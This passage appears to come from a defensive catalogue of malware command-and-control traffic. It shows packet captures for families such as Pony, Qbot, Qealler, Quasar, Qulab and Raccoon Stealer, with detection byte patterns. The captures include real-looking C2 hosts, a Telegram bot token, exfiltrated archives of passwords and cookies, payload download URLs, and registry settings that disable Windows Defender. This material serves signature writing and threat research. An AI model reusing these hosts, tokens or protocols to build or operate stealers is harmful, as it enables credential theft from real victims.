............?PEOJNOOBAAHDMKNGELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com.................?JJIOHDOBJEIEIBJJELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com.................?DBCGBLOBDMGFEIEMELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com.................?JJIOHDOBJEIEIBJJELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com................=.a.gtld-servers.net..nstld.verisign-grs..]..A.........	:...Q.............?PEOJNOOBAAHDMKNGELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com................=.a.gtld-servers.net..nstld.verisign-grs..]..2.........	:...Q.............?DBCGBLOBDMGFEIEMELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com................=.a.gtld-servers.net..nstld.verisign-grs..]..2.........	:...Q.
~~~
~~~
GET /EF003AAB6425775CD949B40C HTTP/1.1
Accept: */*
Cookie: QhTbeUW+YzYYsZWz0PQvBvYIgo8=
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: WOUDERFULU.impresstravel.ga
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 203 
Server: nginx
Date: Tue, 03 Sep 2019 14:37:02 GMT
Content-Type: text/html;charset=UTF-8
Content-Length: 660
Connection: keep-alive
Cache-Control: no-cache
Pragma: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
X-Server: ip-172-31-28-245
Set-Cookie: JSESSIONID=4618E9008B004BEE8FE5C81AB063A332; Path=/; HttpOnly
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/plugx-1.png "Plugx")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/plugx-2.png "PlugxDNS")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/plugx-3.png "Plugx")

#### Pony
Follow tcp stream, not http stream in wireshark
~~~
POST /mlu/forum.php HTTP/1.0
Host: spausence.com
Accept: */*
Accept-Encoding: identity, *;q=0
Accept-Language: en-US
Content-Length: 369
Content-Type: application/octet-stream
Connection: close
Content-Encoding: binary
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)

..|Rk.. ."6d0..)/.....Lo..l{;..:.NJT;.G..3P..n...{.i..eLX..j...K.N.......A.
n.%.....r..&..........J.l.V..of..T..V$... .L...5....6F...9.)......(...
.(O........*[z\.....N....=..4..];....L.W......Q...*.S....V.	7.4.L..v..oi...x..W7....{.....V)...:...1...R..V.......+...]m 
.......B...|D..t.Y.{..............{W.f.._i...i.!..d.C...r.......A.,.z....ta..m..
5!...w+.....p....!0

HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Thu, 03 Oct 2019 17:17:59 GMT
Content-Type: text/html
Connection: close
X-Powered-By: PHP/5.4.45

..
.....f>k.X.......
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/pony.png "Pony")

#### Pony Loader
~~~
POST /eng/gate.php HTTP/1.0
Host: www.jicago-jp.com
Accept: */*
Accept-Encoding: identity, *;q=0
Content-Length: 199
Connection: close
Content-Type: application/octet-stream
Content-Encoding: binary
User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)

HTTP/1.1 200 OK
Date: Wed, 09 Oct 2019 08:44:06 GMT
Server: Apache
Connection: close
Content-Type: text/html; charset=UTF-8

STATUS-IMPORT-OK
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/pony-loader.png "Pony Loader")

#### Predator Pain Keylogger
~~~
From: pain@globalfinancel.com
To: pain@globalfinancel.com
Date: 17 Oct 2019 08:04:48 -0700
Subject: Predator Pain v13 - Server Ran - [XRWJAM272278424]
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: quoted-printable

This is an email notifying you that XRWJAM272278424 has ran your =
logger and emails should be sent to you shortly and at interval c=
hoosen.=0D=0A =0D=0APredator Logger Details: =0D=0AServer Name: R=
egSvcs.exe=0D=0AKeylogger Enabled: False=0D=0AClipboard-Logger En=
abled: False=0D=0ATime Logs will be delivered: Every 60 minutes=0D=0A=
 =0D=0AStealers Enabled: True=0D=0ATime Log will be delivered: Av=
erage 2 to 4 minutes=0D=0A =0D=0ALocal Date and Time: 10/17/2019 =
8:04:41 AM=0D=0AInstalled Language: en-US=0D=0AOperating System: =
Microsoft Windows 7 Professional =0D=0AInternal IP Address: 192.1=
68.180.170=0D=0AExternal IP Address: =0D=0AInstalled Anti-Virus: =
=0D=0AInstalled Firewall:=20

.
250 OK id=1iL7Kv-003iIX-Hl

From: pain@globalfinancel.com
To: pain@globalfinancel.com
Date: 17 Oct 2019 08:05:04 -0700
Subject: Predator Pain v13|Stealer Log - [XRWJAM272278424]
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: quoted-printable

                                 ********************************=
**************=0D=0A                                      Operati=
ng System Intel Recovery=0D=0A                                 **=
********************************************=0D=0ACPU Name: XRWJA=
M272278424=0D=0ALocal Date and Time: 10/17/2019 8:04:55 AM=0D=0AI=
nstalled Language: en-US=0D=0ANet Version: 4.0.30319.42000=0D=0AO=
perating System Platform: Win32NT=0D=0AOperating System Version: =
6.1.7601.65536=0D=0AOperating System: Microsoft Windows 7 Profess=
ional =0D=0AInternal IP Address: 192.168.180.170=0D=0AExternal IP=
 Address: =0D=0AInstalled Anti-Virus: =0D=0AInstalled Firewall: =0D=0A=
                                 ********************************=
**************=0D=0A                                      WEB Bro=
wser Password Recovery=0D=0A                                 ****=
******************************************=0D=0A=0D=0A           =
                      *******************************************=
***=0D=0A                                    Mail Messenger Passw=
ord Recovery=0D=0A                                 **************=
********************************=0D=0A=0D=0A                     =
            **********************************************=0D=0A =
                                   Internet Download Manager Reco=
very=0D=0A                                 **********************=
************************=0D=0A                                 **=
********************************************=0D=0A               =
                       Jdownloader Password Recovery=0D=0A       =
                          ***************************************=
*******

.
250 OK id=1iL7LE-003ina-5V
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/predatorpain.png "Predator Pain Keylogger")

#### Predator the Thief
~~~
POST /api/check.get HTTP/1.1
Content-Type: text/html
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.906.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Host: 95.215.205.56
Content-Length: 0
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Wed, 09 Oct 2019 20:05:42 GMT
Server: Apache
Set-Cookie: SID_INTERFICE=4c616d7fffe95fe8fc2f4f46d272c8a0412c1404; expires=Thu, 10-Oct-2019 20:05:42 GMT; Max-Age=86400; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 132
Keep-Alive: timeout=10, max=100
Connection: Keep-Alive
Content-Type: text/plain; charset=utf-8

nr8uEQylGUpuY0Qjyde/Fn3TGzRg6JFXvSXGhXxBL0Ls2eMYLaWSpJIvp6bRuCqmkclDgfyfYtc7/hQGxqKlJiPdCQ0v/JyN12lNiho7IjBLW3VB02orxGMXTr04WaAQz73q

HTTP/1.1 200 OK
Date: Wed, 09 Oct 2019 20:05:42 GMT
Server: Apache
Set-Cookie: SID_INTERFICE=4c616d7fffe95fe8fc2f4f46d272c8a0412c1404; expires=Thu, 10-Oct-2019 20:05:42 GMT; Max-Age=86400; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 132
Keep-Alive: timeout=10, max=100
Connection: Keep-Alive
Content-Type: text/plain; charset=utf-8

nr8uEQylGUpuY0Qjyde/Fn3TGzRg6JFXvSXGhXxBL0Ls2eMYLaWSpJIvp6bRuCqmkclDgfyfYtc7/hQGxqKlJiPdCQ0v/JyN12lNiho7IjBLW3VB02orxGMXTr04WaAQz73qPOST /api/gate.get?p1=2&p2=5&p3=0&p4=2&p5=0&p6=0&p7=0&p8=0&p9=0&p10=udh8T1P6VQh1ZF9DgIniQjWRSWBTqqYq5k2u HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------228
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.906.121 Safari/537.36
Host: 95.215.205.56
Content-Length: 6028
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: SID_INTERFICE=4c616d7fffe95fe8fc2f4f46d272c8a0412c1404

-----------------------------228
Content-Disposition: form-data; name="file"; filename="s7q3q0u1v7q3q0u1v7.zip"
Content-Type: application/octet-stream

PK..........IO................Outlook/UT
...K.].K.].K.]PK..........IOo...?...F.......Outlook/Outlook.txtUT
...K.].K.].K.]s.M...R...K.t(./.K..e..
H,.../J.......f@.`...+.CK#=C3.=C=C../..PK..........IO................General/UT
...K.].K.].K.]PK..........IO................Cookies/UT
...K.].K.].K.]PK..........IO................History/UT
...K.].K.].K.]PK..........IO................Other/UT
...K.].K.].K.]PK..........IOa.qZ............History/Chrome_0.txtUT
...K.].K.].K.].V[k.8.~..?.............B...>..,{D4.V....?..e..4M.M...`....s...O....3..b%....0.
7.'_.;s6.H}6.kZ.Fz........i...aZ...".".v.P.x>PR.[.D...$Q..."...%
f...Y.[.V.......G.*"...Ig..Y...k=}..}..U....@....T..n.-)7Z.Yt..%...$.P.vQ....p.z..&..t...P[...w...T....6A..!k...:...V...Fp.....-.a.....7......_.X...E../;..T8..7.I..)Y..(..,....)JP..........nf..g..E.\..(..@..XQ.l....".e..a.X .H.?*.".a.F9`..~zrzr..	.M......
.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/predator.png "Predator")

#### Proyecto (aka Nemours) RAT
~~~
0|New - 25-10-19/21:41|United States|USER-PC - admin|Windows 7 Professional - 32 Bits / Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz / 4 /  / 0|US|0|192.168.100.60|0 Cap.|oolkth|9090|OFF| - 0 / || Tiene Capturas de: |New - |||No Available
13|Program Manager|OFF|OFF - 0 / ||
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/proyecto.png "Proyecto")

#### Pyrogenic
flah on "53 E1 6D D3 9E EE 45 D4" on iniial connection, 175 bytes
~~~
00000000  53                                                 S
00000001  e1 6d d3 9e ee 45 d4 ad  26 96 67 86 36 fb f7 cc   .m...E.. &.g.6...
00000011  3f 15 13 b7 cf 5e 99 ac  dc 9d e6 36 cd 61 bd 91   ?....^.. ...6.a..
00000021  37 5c db a0 15 ec f4 5a  9a 63 96 7f 2b e6 b3 3c   7\.....Z .c..+..<
00000031  96 a9 aa fe d6 37 6d f5  1d 57 8f 26 f1 03 a4 7a   .....7m. .W.&...z
00000041  7b d9 5f 01 8c 5e 87 c5  de 80 a2 52 15 24 e0 73   {._..^.. ...R.$.s
00000051  51 70 b4 6f 60 7c a8 4c  df 36 ac df 96 b3 18 b5   Qp.o`|.L .6......
00000061  54 37 74 9b d1 60 06 f1  46 b2 8f e2 23 f2 58 80   T7t..`.. F...#.X.
00000071  de d9 8d d9 10 35 91 7f  d9 74 4b 6e 05 4c 13 9f   .....5.. .tKn.L..
00000081  68 85 65 d0 bb f6 67 0c  78 ae 12 b6 ab 89 90 14   h.e...g. x.......
00000091  e0 47 c5 56 c9 e0 0f 17  73 95 ee 30 08 fa 0e 47   .G.V.... s..0...G
000000A1  cd ec dd 72 db e7 ff bf  b9 57 b3 61 c4 cb 4c      ...r.... .W.a..L
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/pyrogenic.png "Pyrogenic")

#### Qbot
usually url is /t3
~~~
POST /t3 HTTP/1.1
Accept: application/x-shockwave-flash, image/gif, image/jpeg, image/pjpeg, */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: 174.48.72.160
Content-Length: 215
Cache-Control: no-cache

ycgizbarun=8e5ygoO+WS2h/ypd2ZEi8nHeEKPFyrdKrXgLyQd6Gi76j4KxXuMEm2K/lEHrTJqqWdDWXZQWcLyTbSnECgNFerjMjb9ittXV+rg/yqpLMLtOWYw6pCz2nDkPbGnUW3Z61/yZoSoh9zdJzkpTmYMCloxmblZ9Eos4QZHsiMecjlcmNjwU1D/9ShQ6cGKSJxHNVT2lNGCykNU=

HTTP/1.1 200 OK
Server: nginx/1.9.12
Content-Length: 41

ParseHttpResponse() failed pCurlResp=NULL
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/qbot.png "Qbot Qakbot")

#### Qealler RAT
~~~
........t.]{"serverPath":"C:\\Users\\Jonathan\\Desktop\\PO6671.jar","securityRetry":20,"vbox":false,"serverVersion":"v2.0.0","mainPath":"C:\\Users\\Jonathan\\QkpCj","nickName":"14TH TWETWE APRIL","vmware":false,"encryptKey":"NnKHsguoUsbJwLwumvSXFoiWR","operatingSystem":{"osDefaultArch":"amd64","country":{"code":"us","name":"United States"},"icon":"windows7","admin":true,"language":"English (United States)","type":1,"processor":2,"osDefaultName":"Windows 7","computerUser":"Jonathan","javaArchitecture":"amd64","computerName":"JONATHAN-PC","name":"Windows 7 Professional","osDefaultVersion":"6.1","jreVersion":"1.8.0","architecture":"amd64","ram":"3 GB"},"uuid":"7094850e-92de-4eed-b492-65d966bc00b5lumteifxDUDU","command":1,"network":[{"delay":2,"port":4424,"dns":"marketingsiamgrains.zapto.org"}],"jrePath":"C:\\Users\\Jonathan\\Oracle\\bin\\javaw.exe","userTitle":"Jonathan@JONATHAN-PC","security":[{"process":["UserAccountControlSettings.exe"],"code":"user-account-control","reg":[{"value":"\"ConsentPromptBehaviorAdmin\"=dword:00000000\r\n\"ConsentPromptBehaviorUser\"=dword:00000000\r\n\"EnableLUA\"=dword:00000000\r\n\"PromptOnSecureDesktop\"=dword:00000000\r\n","key":"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","valuesCommand":[]}],"name":{"en":"User Account Control"}},{"process":["Taskmgr.exe"],"code":"task-manager","reg":[{"value":"\"DisableTaskMgr\"=dword:00000002\r\n","key":"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","valuesCommand":[{"name":"DisableTaskMgr","valueCommand":"2","valueCommandType":"REG_DWORD","key":"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"}]}],"name":{"en":"Task Manager"}},{"process":["procexp.exe"],"code":"msconfig","name":{"en":"MsConfig"}},{"process":["MSASCuiL.exe","MSASCui.exe","MsMpEng.exe","MpUXSrv.exe","MpCmdRun.exe","NisSrv.exe","ConfigSecurityPolicy.exe"],"code":"windows-defender","reg":[{"value":"\"DisableAntiSpyware\"=dword:00000001\r\n","key":"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender","valuesCommand":[{"name":"DisableAntiSpyware","valueCommand":"1","valueCommandType":"REG_DWORD","key":"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender"}]},{"value":"\"DisableBehaviorMonitoring\"=dword:00000001\r\n\"DisableOnAccessProtection\"=dword:00000001\r\n\"DisableScanOnRealtimeEnable\"=dword:00000001\r\n","key":"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection","valuesCommand":[{"name":"DisableBehaviorMonitoring","valueCommand":"1","valueCommandType":"REG_DWORD","key":"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"},{"name":"DisableOnAccessProtection","valueCommand":"1","valueCommandType":"REG_DWORD","key":"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"},{"name":"DisableScanOnRealtimeEnable","valueCommand":"1","valueCommandType":"REG_DWORD","key":"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"}]}],"name":{"en":"Windows Defender"}}],"installDate":{"daysRunning":0,"lastModified":1586920462000},"installation":{"jarName":"vrpiI","moduleFolder":"fZrJY","moduleEntry":"LmqeMOCMZKDnCAMInhONhNssACvKupnYNmRGqciHQTmDqMeajNLIKvjeiGOkSFQDkiMQfSaBSp/atbrMtgqBWJtmbTArraiRtMHwMQqwICMrbnBkjtHHUsULWJhUZZJAlRSSnSZvWFv/hidBDxdVcfNQOjMqVwjrrjqXirgxqjnS.BlDbZGWeXeYlqIdKpxKaROeDvagYjATCOaTNXXRK","uniqueIDFile":".ntusernt.ini","delay":2,"jreFolder":"Oracle","active":true,"mainFolder":"QkpCj","moduleExtension":"Jus.txt","jarExtension":"class.txt","jarRegistry":"eHgASPs"},"localIp":"192.168.100.101"}t..{"command":104}t..{"command":114}t..{"command":115}t.N{"title":"\r\n[Administrator: Command Prompt - dump  2888]\r\n","command":115}t.H{"time":{"hour":0,"minute":0,"second":0},"command":114,"sleeping":false}t.A{"title":"\r\n[Administrator: Command Prompt]\r\n","command":115}t.,{"title":"\r\n[TCPHound]\r\n","command":115}t. {"moduleId":"008","command":108}t.X{"title":"\r\n[MegaDumper 1.0 by CodeCracker / SnD (Not Responding)]\r\n","command":115}t.G{"title":"\r\n[MegaDumper 1.0 by CodeCracker / SnD]\r\n","command":115}t. {"moduleId":"008","command":108}t.H{"time":{"hour":0,"minute":0,"second":0},"command":114,"sleeping":false}t.,{"title":"\r\n[TCPHound]\r\n","command":115}t.N{"title":"\r\n[Administrator: Command Prompt - dump  2888]\r\n","command":115}t..{"command":111}
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/qealler.png "Qealler")

#### Quasar RAT
Flag on "40 00 00 00" pattern, 68 data bytes on first packet
~~~
00000000  40 00 00 00 3e 83 58 08 ad d1 05 8d 77 20 53 1f   @...>.X. ....w S.
00000010  dc 2e e8 99 0a f3 f1 bb 3a 8c c2 a1 9d 72 4a 69   ........ :....rJi
00000020  e6 60 97 da 1e 76 87 16 91 f2 1b c4 f4 89 f9 8a   .`...v.. ........
00000030  20 5b 19 e5 7c ae ed f1 b4 5a d2 ce 5f 86 17 20    [..|... .Z.._.. 
00000040  c6 b3 03 8c                                        ....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/quasar.png "Quasar")

#### Qudox
~~~
GET /gate.php?check HTTP/1.1
Host: 195.2.92.64

HTTP/1.1 200 OK
Date: Fri, 04 Sep 2020 13:08:34 GMT
Server: Apache/2.4.25 (Debian)
Content-Length: 12
Content-Type: text/html; charset=UTF-8

by+B+dC9UQ==

GET /gate.php HTTP/1.1
Host: 195.2.92.64
Content-Length: 76

TBOs3enZOi2/1kVNZdn9bAt1EnPmqL4g9GBGU95XoNzQo6hiYel7j0rkpapVu45CkORs54FJtg==
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/qudox.png "Qudox")

#### Qulab Clipper
~~~
GET /bot873737212:AAFatKVhb76Tb7yoLv3dCtDO9sgKAsUV_gg/getMe HTTP/1.1
User-Agent: AutoIt
Host: api.telegram.org
Cache-Control: no-cache

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 01 Nov 2019 18:11:04 GMT
Content-Type: application/json
Content-Length: 124
Connection: keep-alive
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Expose-Headers: Content-Length,Content-Type,Date,Server,Connection

{"ok":true,"result":{"id":873737212,"is_bot":true,"first_name":"MASADCLIPPERANDSTEALER","username":"aliclipperstealer_bot"}}
~~~
~~~
POST /bot873737212:AAFatKVhb76Tb7yoLv3dCtDO9sgKAsUV_gg/sendDocument HTTP/1.1
Connection: Keep-Alive
Content-Type: multipart/form-data; boundary=----WinHttpBoundaryLine_56206.90110
Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,*/*;q=0.5
Accept-Charset: utf-8;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 6.1) WinHttp/1.6.4.0 (WinHTTP/5.1) like Gecko
Content-Length: 55058
Host: api.telegram.org

------WinHttpBoundaryLine_56206.90110
Content-Disposition: form-data; name="chat_id"

880414267
------WinHttpBoundaryLine_56206.90110
Content-Disposition: form-data; name="document"; filename="ENU_6887FE9730D2535E9D41.7z"
Content-Type: application/octet-stream

7z..'...E..P........$.......aO...5...]....C.k".0DL.p1SC	...UM..,.j
.M.%...}...)..p.d...7.+..w..,..\....w.0z9:6....6...94..._...r..Xu.,........
.<&:e...S.4.....k._4jn.
.....)+/q.*?..2 ..j..tj.Y....M.o...$1...H.....r..*%.J.A......Y..2.......0..+.......uz..../O......48.7........&.A...WT{...v.W.\.o.....cax..H.Y...A....<4<.8|........p0E....f..W.X.....Z..	...k5..0 .1t..r.1L.p.Y,.3.....H.f......0.$....JGv...z..L'....'...&<.&m....@rS...r......u...6.#.7z...h.B..._.S.....z..F..q...].V3`w1/...._f(m...$....W<....L&Zv.a......HR.'.r...H'J(.f.......&_?..8.EL...#...j..(....._.\Vw
....d%{.$MR`e!.]..$
...-.ct...~Za@YsbNNG...~.R......b..'..oRW3.L..N..&.Q4.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/qulab.png "Qulab")

#### RaaLoader aka Pefsire
~~~
00000000  12 10 00 00 00 00 00 00  00 00 00 00               ........ ....
    00000000  00 00 00 00 06                                     .....
0000000C  00 00 00 00 06                                     .....
    00000005  00 00 00 00 06                                     .....
00000011  00 00 00 00 06                                     .....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raaloader.png "RaaLoader")

#### Raccoon Stealer
~~~
POST /gate/log.php HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 155
Host: 35.189.105.242

params=Ym90X2lkPTkwMDU5QzM3LTEzMjAtNDFBNC1CNThELTJCNzVBOTg1MEQyRl9hZG1pbiZjb25maWdfaWQ9NGVkZTQxZmUwZWE5NjMwMzRhM2Q2NWYwZGQ0NDJkZTQ2NzFjMjE0ZiZkYXRhPW51bGw=HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 30 Sep 2019 19:36:57 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Access-Control-Allow-Origin: *

{"url":"http://35.189.105.242/file_handler/file.php?hash=559f10a49e5f74c12b67d2b61c0dea701f752e43&js=cbe0dbfb63ca8503c1938fc9cdd5f5f3818d81b9&callback=http://35.189.105.242/gate","attachment_url":"http://35.189.105.242/gate/sqlite3.dll","libraries":"http://35.189.105.242/gate/libs.zip","ip":"89.187.165.57","config":{"masks":null,"loader_urls":["https://mygift.space/download/beam.exe"]},"is_screen_enabled":0,"is_history_enabled":0}HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 30 Sep 2019 19:36:57 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Access-Control-Allow-Origin: *

{"url":"http://35.189.105.242/file_handler/file.php?hash=559f10a49e5f74c12b67d2b61c0dea701f752e43&js=cbe0dbfb63ca8503c1938fc9cdd5f5f3818d81b9&callback=http://35.189.105.242/gate","attachment_url":"http://35.189.105.242/gate/sqlite3.dll","libraries":"http://35.189.105.242/gate/libs.zip","ip":"89.187.165.57","config":{"masks":null,"loader_urls":["https://mygift.space/download/beam.exe"]},"is_screen_enabled":0,"is_history_enabled":0}POST /file_handler/file.php?hash=559f10a49e5f74c12b67d2b61c0dea701f752e43&js=cbe0dbfb63ca8503c1938fc9cdd5f5f3818d81b9&callback=http://35.189.105.242/gate HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: multipart/form-data, boundary=Jfbvjwj3489078yuyetu
Content-Length: 2152
Host: 35.189.105.242

._=
--Jfbvjwj3489078yuyetu
content-disposition: form-data; name="file"; filename="data.zip"
Content-Type: application/octet-stream

PK..........>O..5kf.......
...passwords.txtUT
..`Y.]ZY.]ZY.]..w..Rp..O.IUp.(..M......
f....[.....%&.&..g.%....r........R+.
.K@..\....P....bcS3^.^.`..n.E.n..0.I2..PK..........>O"..:............browsers/firefox_cookie.txtUT
..`Y.]`Y.]`Y.]..KK.@...S.O.8..+.. .+..kJ6a..!.	mb...T.qQ......
.@...:.,m..y....
a...RK.
.......]w.\.U.k...L<..........s.m...|..9=.].l..0...7W...zY..mi....e...........di"..|M.t2...T..E...6.RI...dB.-s..c<.c.......;.r..E....tr.[..
......g@..X....^.Dl.`W.?.YQ.o...F...$\..K..v..+..." 0.|.PK..........>O................browsers/firefox_urls.txtUT
..`Y.]`Y.]`Y.]..K..0...=	w....>hI....4..(h.lI[.zz....v7.........s.......}.MS...@kd_.n........Vw.e.
........H1%.@.8._..A.+\.U._.O.....,C1..q..tj.......'......`..c_.+.Z.N...(2,....|..	8.vd.f.p.1.,y..PK..........>O.JJ.:...Z.......browsers/chrome_autofill.txtUT
..ZY.]ZY.]ZY.]s./.U.K.M.Rp.,*...2y..@.e.9.@a.......^..0D.O"6.A.)E.... ..PK..........>O..GMN...|.......mails/outlook.txtUT
..eY.]eY.]eY.]..
	P.N-*K-.2.4.34..3.3..
..0.*.....c....Z.P._.....U.Z.T.M" ...<.(."Y......r..PK..........>O..DH....o.......System Info.txtUT
..eY.]eY.]eY.]mR]k.0.}^ ..>&.6.l..`0'Y..f.$...(.....d$;k..'ws)ez.:..su?~.D][k.....~A.W.3...F....Qx..d.+-...Vi..bn...?.K..<e.2`......M........2NH0.%OrNJ..N..v..5....\%yD.F..Vi...u..yV.EF...^..2..t......'..........5|.!..G.
s.C9.>..V...;...K ^..x..P.1-....8.G..2...pE..<........Y.........?..".~.5....c.F|........0..u8;....h..2..	X....g..a"..|.>T;.IV$.[.,[...{...c..
. ...f.e.y...%k.[-.@.U..C7?.yX.a.p..o*.8.6..PI.v..7.......Tm.y..?PK............>O..5kf.......
.	....... .......passwords.txtUT...`Y.]PK............>O"..:..........	....... .......browsers/firefox_cookie.txtUT...`Y.]PK............>O..............	....... .......browsers/firefox_urls.txtUT...`Y.]PK............>O.JJ.:...Z.....	....... .......browsers/chrome_autofill.txtUT...ZY.]PK............>O..GMN...|.....	....... ...~...mails/outlook.txtUT...eY.]PK............>O..DH....o.....	....... .......System Info.txtUT...eY.]PK....................
--Jfbvjwj3489078yuyetu--HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 30 Sep 2019 19:37:10 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Access-Control-Allow-Origin: *

true"success"
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raccoon-1.png "Predator")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raccoon-2.png "Predator")

#### Ramnit
~~~
GET / HTTP/1.1
Host: www.yx-lj.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

HTTP/1.1 200 OK
Content-Length: 114482
Content-Type: text/html
Content-Location: http://www.yx-lj.com/index.htm
Last-Modified: Tue, 21 May 2019 01:43:35 GMT
Accept-Ranges: bytes
ETag: "47c7bf9a76fd51:ac9"
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Date: Thu, 17 Oct 2019 18:56:31 GMT

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>..........</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<meta name="Keywords" content="........,................,........" />
<meta name="Description" content="...................................................." />
<link href="images/style.css" rel="stylesheet" type="text/css">
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	background-color: #000000;
}
